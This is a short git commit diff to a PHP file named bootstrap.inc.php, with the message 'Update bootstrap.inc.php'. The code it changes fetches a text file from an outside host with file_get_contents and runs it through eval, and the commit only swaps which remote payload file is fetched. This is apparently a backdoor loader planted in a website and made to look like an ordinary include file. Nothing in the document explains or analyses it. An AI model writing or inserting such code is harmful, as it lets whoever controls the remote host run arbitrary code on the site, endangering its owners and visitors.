1964b0063a5ea501a25ce1b14d9060c0af332809
batskulah <alfanpekan@gmail.com>
2026-06-16 17:47:22 +0800

    Update bootstrap.inc.php

--- bootstrap.inc.php
+++ bootstrap.inc.php
@@ -1,5 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/poltop.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/polbal.txt'));
 $url = "?> ".$url;
 eval($url);
 
